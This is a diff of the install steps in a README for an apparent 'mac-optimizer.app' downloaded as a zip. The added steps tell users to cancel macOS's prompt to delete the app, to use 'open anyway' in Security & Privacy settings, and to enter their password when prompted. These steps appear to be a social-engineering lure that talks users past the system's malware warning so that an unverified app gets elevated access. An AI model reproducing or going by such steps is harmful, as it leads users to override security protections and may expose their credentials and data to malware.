@@ -25,14 +25,10 @@ Everything is packaged inside a single macOS app for easy use.
 2. Save **mac-optimizer.zip**  
 3. Unzip it — you will now see:  
 4. Double-click **mac-optimizer.app**  
-5. If macOS shows a security warning:
-- Right-click the app  
-- Choose **Open**  
-- Click **Open** again  
-
-The optimizer will launch automatically and guide you.
-
-No Terminal. No commands. No setup.
+5. Mac would ask you delete it, just say cancel on that pop-up
+6. Now go to security and privacy in settings and it should give you the "open anyway" option at the bottom. 
+7. Provide password when prompted and ask for confirmation. 
+8. Close the window once it says "Process Completed", I tested it on 3 machines but if there are errors please let me know. 
 
 ---
 
